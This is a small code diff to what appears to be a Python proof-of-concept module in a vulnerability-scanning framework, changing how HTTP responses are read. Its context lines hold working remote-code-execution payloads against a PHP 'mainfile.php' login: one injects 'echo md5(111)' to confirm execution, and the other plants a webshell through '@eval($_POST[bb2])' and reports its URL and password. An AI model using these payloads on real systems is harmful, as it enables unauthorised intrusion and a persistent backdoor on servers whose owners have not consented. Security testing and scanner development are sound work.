@@ -48,7 +48,7 @@ class Poc(ABPoc):
             payload = '/mainfile.php?username=RCE&password=BB2&_login=1&Logon=%27;echo%20md5(111);%27'
             vul_url = target + payload
             response = requests.get(vul_url)
-            text = response.content
+            text = response.text
             if '698d51a19d8a121ce581499d7b701668' in text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -65,7 +65,7 @@ class Poc(ABPoc):
             payload = '/mainfile.php?username=RCE&password=BB2&_login=1&Logon=%27;echo%20md5(111);@eval($_POST[bb2]);%27'
             vul_url = target + payload
             response = requests.get(vul_url)
-            text = response.content
+            text = response.text
             if '698d51a19d8a121ce581499d7b701668' in text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞;webshell={webshell},passwd=bb2'.format(
                     target=self.target, name=self.vuln.name, webshell=vul_url))
